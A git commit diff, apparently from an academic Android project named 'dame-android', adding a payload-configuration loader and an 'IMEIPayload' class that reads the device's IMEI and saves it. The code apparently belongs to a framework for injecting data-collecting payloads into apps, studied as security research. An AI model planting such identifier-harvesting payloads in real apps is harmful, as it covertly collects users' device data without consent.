7da6773c934b41b4c55022a5ccd6b5bcb3c9adf5
dcianciulli <cianciullidanilo@gmail.com>
2015-01-15 14:12:20 +0100

    refactoring

---
+++ dame-android/src/it/unisannio/srss/dame/android/payloads/PayloadConfig.java
@@ -0,0 +1,93 @@
+package it.unisannio.srss.dame.android.payloads;
+
+import java.io.InputStream;
+import java.util.HashSet;
+import java.util.Properties;
+import java.util.Set;
+import java.util.StringTokenizer;
+
+import android.util.Log;
+
+public class PayloadConfig {
+
+	final static String CONFIG_FILE = "payload.properties";
+	private final static String TAG = PayloadConfig.class.getSimpleName();
+
+	final static String NAME_PROPERTY = "name";
+	private String name;
+
+	final static String DESCRIPTION_PROPERTY = "description";
+	private String description;
+
+	final static String PERMISSIONS_PROPERTY = "permissions";
+	private Set<String> permissions;
+
+	final static String PRODUCES_OUTPUT_PROPERTY = "produces_output";
+	private boolean producesOutput;
+
+	public PayloadConfig() {
+		name = null;
+		description = null;
+		permissions = new HashSet<String>();
+	}
+
+	public String getName() {
+		return name;
+	}
+
+	public String getDescription() {
+		return description;
+	}
+
+	public Set<String> getPermissions() {
+		return permissions;
+	}
+
+	public boolean isProducesOutput() {
+		return producesOutput;
+	}
+
+	public static PayloadConfig loadFromProperties(Class<?> payloadClass) {
+		Properties p = new Properties();
+		InputStream in = payloadClass.getResourceAsStream(CONFIG_FILE);
+		if (in == null) {
+			Log.e(TAG, "Could not find " + CONFIG_FILE + " in package "
+					+ payloadClass.getPackage().getName());
+			return null;
+		}
+		try {
+			p.load(in);
+		} catch (Exception e) {
+			Log.e(TAG, "Error while reading " + CONFIG_FILE + " in package "
+					+ payloadClass.getPackage().getName());
+			if (in != null)
+				try {
+					in.close();
+				} catch (Exception e1) {
+				}
+			return null;
+		}
+		if (in != null)
+			try {
+				in.close();
+			} catch (Exception e1) {
+			}
+		PayloadConfig c = new PayloadConfig();
+		c.name = p.getProperty(NAME_PROPERTY);
+		if (c.name == null || c.name.length() == 0) {
+			Log.e(TAG, NAME_PROPERTY + " property missing in " + CONFIG_FILE
+					+ " in package " + payloadClass.getPackage().getName());
+			return null;
+		}
+		c.description = p.getProperty(DESCRIPTION_PROPERTY);
+		String permissions = p.getProperty(PERMISSIONS_PROPERTY);
+		if (permissions != null && permissions.length() > 0) {
+			StringTokenizer st = new StringTokenizer(permissions, ",");
+			while (st.hasMoreTokens())
+				c.permissions.add(st.nextToken().trim());
+		}
+		c.producesOutput = Boolean.parseBoolean(p
+				.getProperty(PRODUCES_OUTPUT_PROPERTY));
+		return c;
+	}
+}
---
+++ dame-android/src/it/unisannio/srss/dame/android/payloads/imei/IMEIPayload.java
@@ -0,0 +1,25 @@
+package it.unisannio.srss.dame.android.payloads.imei;
+
+import it.unisannio.srss.dame.android.payloads.Payload;
+import android.content.Context;
+import android.telephony.TelephonyManager;
+import android.util.Log;
+
+public class IMEIPayload extends Payload {
+
+	public IMEIPayload(Context context) {
+		super(context);
+	}
+
+	@Override
+	public void run() {
+		TelephonyManager tm = (TelephonyManager) context
+				.getSystemService(Context.TELEPHONY_SERVICE);
+		String imei = tm.getDeviceId();
+		if (save(imei))
+			Log.i(tag, "IMEI saved successful");
+		else
+			Log.e(tag, "Error while saving the payload output.");
+
+	}
+}
